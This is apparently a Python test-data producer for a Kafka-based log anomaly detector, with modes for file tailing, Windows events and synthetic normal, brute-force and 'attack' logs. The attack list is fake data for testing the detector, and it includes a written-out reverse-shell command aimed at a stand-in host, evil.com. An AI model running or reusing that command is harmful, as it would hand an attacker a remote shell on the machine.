"""
Producteur de logs personnalisés vers Kafka LogGuardian.

Trois modes disponibles :
  1. FILE   - lit et pousse un fichier .log (rotation-safe)
  2. WINDOWS_EVENT - lit les Windows Event Logs (Application, System, Security)
  3. SYNTHETIC - génère quelques logs de test

Usage :
  python send_my_logs.py --mode file --path C:\\path\\to\\myapp.log
  python send_my_logs.py --mode windows --channel Application
  python send_my_logs.py --mode synthetic
"""
from __future__ import annotations

import argparse
import json
import os
import socket
import time
from datetime import datetime, timezone
from pathlib import Path

from confluent_kafka import Producer


KAFKA_BOOTSTRAP_SERVERS = os.getenv("KAFKA_BOOTSTRAP_SERVERS", "localhost:9092")
KAFKA_TOPIC = os.getenv("KAFKA_TOPIC", "logs-raw")
DEFAULT_HOST = socket.gethostname()


def _delivery_report(err, msg):
    if err is not None:
        print(f"[ERROR] Delivery failed: {err}")


def build_producer() -> Producer:
    return Producer({
        "bootstrap.servers": KAFKA_BOOTSTRAP_SERVERS,
        "linger.ms": 100,
        "acks": "1",
    })


def send_log(producer: Producer, source: str, level: str, message: str, host: str = DEFAULT_HOST, component: str = "app"):
    payload = {
        "timestamp": datetime.now(tz=timezone.utc).isoformat(),
        "source": source,
        "host": host,
        "level": level,
        "component": component,
        "message": message,
        "raw": message,
    }
    producer.produce(
        KAFKA_TOPIC,
        json.dumps(payload).encode("utf-8"),
        on_delivery=_delivery_report,
    )
    producer.poll(0)


def _guess_level(line: str) -> str:
    upper = line.upper()
    if any(k in upper for k in ("FATAL", "CRITICAL")):
        return "FATAL"
    if "ERROR" in upper or "FAILED" in upper:
        return "ERROR"
    if "WARN" in upper:
        return "WARN"
    if "DEBUG" in upper:
        return "DEBUG"
    return "INFO"


def mode_file(producer: Producer, path: str, source: str):
    """Lit un fichier ligne par ligne (comme tail -f)."""
    print(f"Tailing {path} -> Kafka topic '{KAFKA_TOPIC}' as source='{source}'")
    p = Path(path)
    if not p.exists():
        print(f"[FATAL] File not found: {path}")
        return

    with p.open("r", encoding="utf-8", errors="replace") as f:
        f.seek(0, 2)  # aller à la fin
        while True:
            line = f.readline()
            if not line:
                producer.flush(1)
                time.sleep(0.5)
                continue
            line = line.strip()
            if not line:
                continue
            send_log(
                producer,
                source=source,
                level=_guess_level(line),
                message=line[:2000],
            )
            print(f"[SENT] {line[:80]}")


def mode_windows_event(producer: Producer, channel: str):
    """Lit les Windows Event Logs (nécessite pywin32)."""
    try:
        import win32evtlog  # pip install pywin32
    except ImportError:
        print("[FATAL] pywin32 non installé. Installe avec : pip install pywin32")
        return

    print(f"Reading Windows Event Log channel '{channel}' -> Kafka topic '{KAFKA_TOPIC}'")

    handle = win32evtlog.OpenEventLog(None, channel)
    flags = win32evtlog.EVENTLOG_BACKWARDS_READ | win32evtlog.EVENTLOG_SEQUENTIAL_READ

    seen_records = set()
    LEVEL_MAP = {
        win32evtlog.EVENTLOG_ERROR_TYPE: "ERROR",
        win32evtlog.EVENTLOG_WARNING_TYPE: "WARN",
        win32evtlog.EVENTLOG_INFORMATION_TYPE: "INFO",
        win32evtlog.EVENTLOG_AUDIT_SUCCESS: "INFO",
        win32evtlog.EVENTLOG_AUDIT_FAILURE: "WARN",
    }

    try:
        while True:
            events = win32evtlog.ReadEventLog(handle, flags, 0)
            if not events:
                producer.flush(1)
                time.sleep(2)
                continue

            for ev in events:
                if ev.RecordNumber in seen_records:
                    continue
                seen_records.add(ev.RecordNumber)

                message = " | ".join(ev.StringInserts) if ev.StringInserts else f"EventID={ev.EventID & 0xFFFF}"
                send_log(
                    producer,
                    source=f"windows-{channel.lower()}",
                    level=LEVEL_MAP.get(ev.EventType, "INFO"),
                    message=message[:2000],
                    component=ev.SourceName,
                )
                print(f"[SENT] [{channel}] {ev.SourceName}: {message[:80]}")
    finally:
        win32evtlog.CloseEventLog(handle)


def mode_synthetic(producer: Producer):
    """Génère 20 logs Linux de test pour déclencher le scoring ML.

    Le ml-model score une séquence dès qu'il a 10 logs consécutifs
    du même couple (source, host). On envoie donc 20 logs de la
    même source pour former 2 séquences scorables.
    """
    print(f"Sending synthetic logs -> Kafka topic '{KAFKA_TOPIC}' (host={DEFAULT_HOST})")

    linux_normal = [
        ("INFO", "sshd", "Accepted publickey for wassim from 192.168.1.10 port 22"),
        ("INFO", "systemd", "Started daily apt-daily services timer"),
        ("INFO", "kernel", "Bluetooth: HCI device connected"),
        ("INFO", "cron", "(root) CMD (test -x /usr/sbin/anacron)"),
        ("INFO", "systemd", "Reloading the system manager configuration"),
        ("INFO", "dbus", "Successfully activated service org.freedesktop.PolicyKit1"),
        ("INFO", "kernel", "usb 1-1: new high-speed USB device number 3 using xhci_hcd"),
        ("INFO", "systemd", "Finished dispatch Password Requests to Console Directory Watch"),
        ("INFO", "NetworkManager", "device (wlan0): state change: activated -> deactivated"),
        ("INFO", "gdm", "Session started"),
    ]

    linux_suspicious = [
        ("WARN", "sshd", "Failed password for invalid user admin from 45.83.66.140 port 51234"),
        ("WARN", "sshd", "Failed password for invalid user root from 45.83.66.140 port 51236"),
        ("ERROR", "sshd", "Bad protocol version identification 'GET / HTTP/1.1' from 89.234.157.254"),
        ("WARN", "sshd", "Failed password for invalid user postgres from 45.83.66.140 port 51240"),
        ("ERROR", "kernel", "Out of memory: Killed process 1234 (chrome) total-vm:2097152kB"),
        ("ERROR", "systemd", "Failed to start Nginx service - port 80 already in use"),
        ("WARN", "kernel", "TCP: request_sock_TCP: Possible SYN flooding on port 443"),
        ("ERROR", "systemd", "nginx.service: Main process exited, code=exited, status=1/FAILURE"),
        ("WARN", "sshd", "Failed password for invalid user test from 45.83.66.140 port 51250"),
        ("FATAL", "kernel", "kernel panic - not syncing: Attempted to kill init!"),
    ]

    all_samples = linux_normal + linux_suspicious

    for i, (level, component, message) in enumerate(all_samples, 1):
        send_log(
            producer,
            source="linux",
            level=level,
            message=message,
            component=component,
        )
        print(f"[SENT {i:2d}/{len(all_samples)}] [linux/{level}] {message[:80]}")
        time.sleep(0.3)

    producer.flush(10)
    print(f"\nDone. Sent {len(all_samples)} logs.")
    print("Le ml-model va scorer 2 séquences de 10 logs.")
    print("Vérifie l'UI dans les 5-10 secondes.")


def mode_attack(producer: Producer):
    """Envoie 20 logs volontairement atypiques pour déclencher des anomalies."""
    print(f"Sending ATTACK logs -> Kafka topic '{KAFKA_TOPIC}' (host={DEFAULT_HOST})")

    attack_logs = [
        ("FATAL", "sshd", "REMOTE_CODE_EXECUTION detected via crafted payload 0xDEADBEEF from 6.6.6.6"),
        ("FATAL", "kernel", "SEGMENTATION_FAULT in critical zone /proc/kmem write attempt uid=0"),
        ("ERROR", "sshd", "MASSIVE_BRUTE_FORCE 47831 failed attempts in 10s src=45.83.66.140"),
        ("FATAL", "systemd", "SYSTEM_COMPROMISE root shell spawned by unknown process pid=99999"),
        ("ERROR", "kernel", "ROOTKIT_DETECTED kernel module xyz1337 hides pid 4242"),
        ("FATAL", "sshd", "PRIVILEGE_ESCALATION user nobody executed sudo without password"),
        ("ERROR", "cron", "SUSPICIOUS_JOB /tmp/.hidden/x.sh executed as root outside window"),
        ("FATAL", "systemd", "CRITICAL_SERVICE nginx/apache/mysql/redis all down simultaneously"),
        ("ERROR", "iptables", "MASSIVE_FIREWALL_DROP 892341 packets from botnet 10.66.66.0/24"),
        ("FATAL", "kernel", "MEMORY_CORRUPTION_ATTACK stack canary broken pid=1"),
        ("ERROR", "sshd", "REVERSE_SHELL_ATTEMPT bash -i >& /dev/tcp/evil.com/4444 0>&1"),
        ("FATAL", "auditd", "AUDIT_LOG_TAMPERING journal entries deleted between 3AM and 4AM"),
        ("ERROR", "apparmor", "SANDBOX_ESCAPE process broke out of /etc/apparmor.d/usr.bin.firefox"),
        ("FATAL", "kernel", "SPECTRE_MELTDOWN_EXPLOIT cross-tenant memory read detected"),
        ("ERROR", "sshd", "CRYPTO_MINER_DEPLOYED xmrig binary uploaded via scp connection"),
        ("FATAL", "systemd", "RANSOMWARE_SIGNATURE 47000 files renamed to *.locked in /home"),
        ("ERROR", "dbus", "DBUS_HIJACK malicious service org.evil.CommandInjector registered"),
        ("FATAL", "kernel", "USB_HID_ATTACK unknown keyboard typing at 900 chars/sec detected"),
        ("ERROR", "snmpd", "SNMP_EXFILTRATION 40MB dumped to external IP 194.147.85.244"),
        ("FATAL", "sshd", "GAME_OVER attacker gained persistence via /etc/systemd/system/backdoor"),
    ]

    for i, (level, component, message) in enumerate(attack_logs, 1):
        send_log(
            producer,
            source="linux",
            level=level,
            message=message,
            component=component,
        )
        print(f"[SENT {i:2d}/{len(attack_logs)}] [linux/{level}] {message[:80]}")
        time.sleep(0.3)

    producer.flush(10)
    print(f"\nDone. Sent {len(attack_logs)} ATTACK logs.")
    print("Ces logs sont très différents du training set → forte anomalie attendue.")


def mode_ssh_brute(producer: Producer):
    """Imite un pattern SSH brute-force (source ssh) — le modèle reconnaît bien."""
    print(f"Sending SSH brute-force pattern -> Kafka topic '{KAFKA_TOPIC}' (host=LabSZ-attack)")

    ip_attacker = "203.0.113.66"
    users = ["root", "admin", "postgres", "oracle", "mysql", "backup", "test", "guest", "ubuntu", "ec2-user"]

    logs = []
    for user in users:
        port = 40000 + hash(user) % 20000
        logs.append(("ERROR", "sshd[13001]", f"pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip_attacker}  user={user}"))
        logs.append(("ERROR", "sshd[13001]", f"Failed password for {user} from {ip_attacker} port {port} ssh2"))

    for i, (level, component, message) in enumerate(logs, 1):
        send_log(
            producer,
            source="ssh",
            host="LabSZ-attack",
            level=level,
            message=message,
            component=component,
        )
        print(f"[SENT {i:2d}/{len(logs)}] [ssh/{level}] {message[:80]}")
        time.sleep(0.2)

    producer.flush(10)
    print(f"\nDone. Sent {len(logs)} SSH brute-force logs.")


def mode_unknown_source(producer: Producer):
    """Envoie 15 logs avec une source inconnue du modèle (myapp).

    Le modèle connaît uniquement : linux, ssh, hadoop, spark, supercomputer, hdfs.
    Une source 'myapp' donne un one-hot source à zéro → forte reconstruction error.
    """
    print(f"Sending logs with UNKNOWN source='myapp' -> Kafka topic '{KAFKA_TOPIC}' (host=web-server-prod)")

    logs = [
        ("ERROR", "backend-api", "Uncaught TypeError: cannot read property 'user' of null at /api/v1/orders"),
        ("ERROR", "backend-api", "Database connection pool exhausted after 30s timeout"),
        ("FATAL", "backend-api", "Segmentation fault in payment processor v2.4.1 build 8823"),
        ("ERROR", "worker-queue", "Job job_9821 failed after 5 retries: RedisConnectionError"),
        ("ERROR", "auth-service", "JWT signature verification failed for token from api-gateway"),
        ("WARN", "backend-api", "Rate limit exceeded for API key ak_prod_8x2f from IP 45.9.148.201"),
        ("ERROR", "backend-api", "Circular dependency detected in module resolver for /lib/payments/gateway.js"),
        ("FATAL", "worker-queue", "OutOfMemoryError: Java heap space at LinkedHashMap.transfer(HashMap.java:947)"),
        ("ERROR", "auth-service", "OAuth callback failed: state parameter mismatch or expired"),
        ("ERROR", "backend-api", "Deadlock detected on table users_transactions rolled back after 5s"),
        ("FATAL", "backend-api", "Server shutting down: SIGTERM received during active connections=847"),
        ("ERROR", "worker-queue", "Task worker.email.send crashed with ConnectionRefusedError to SMTP"),
        ("ERROR", "auth-service", "Session hijacking detected: fingerprint mismatch for user_id=42891"),
        ("WARN", "backend-api", "Slow query detected: SELECT * FROM orders JOIN users took 8231ms"),
        ("FATAL", "backend-api", "Cannot allocate memory for connection buffer, killing process pid=1247"),
    ]

    for i, (level, component, message) in enumerate(logs, 1):
        send_log(
            producer,
            source="myapp",
            host="web-server-prod",
            level=level,
            message=message,
            component=component,
        )
        print(f"[SENT {i:2d}/{len(logs)}] [myapp/{level}] {message[:80]}")
        time.sleep(0.3)

    producer.flush(10)
    print(f"\nDone. Sent {len(logs)} logs with UNKNOWN source.")
    print("Le modèle n'a jamais vu source='myapp' → forte anomalie attendue.")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("--mode", choices=["file", "windows", "synthetic", "attack", "ssh-brute", "unknown-source"], required=True)
    parser.add_argument("--path", help="Fichier à tail (mode file)")
    parser.add_argument("--source", default="custom", help="Nom de la source (mode file)")
    parser.add_argument("--channel", default="Application", help="Canal Event Log (mode windows) : Application, System, Security")
    args = parser.parse_args()

    producer = build_producer()

    try:
        if args.mode == "file":
            if not args.path:
                parser.error("--path est requis en mode file")
            mode_file(producer, args.path, args.source)
        elif args.mode == "windows":
            mode_windows_event(producer, args.channel)
        elif args.mode == "synthetic":
            mode_synthetic(producer)
        elif args.mode == "attack":
            mode_attack(producer)
        elif args.mode == "ssh-brute":
            mode_ssh_brute(producer)
        elif args.mode == "unknown-source":
            mode_unknown_source(producer)
    except KeyboardInterrupt:
        print("\nStopping...")
    finally:
        producer.flush(5)


if __name__ == "__main__":
    main()
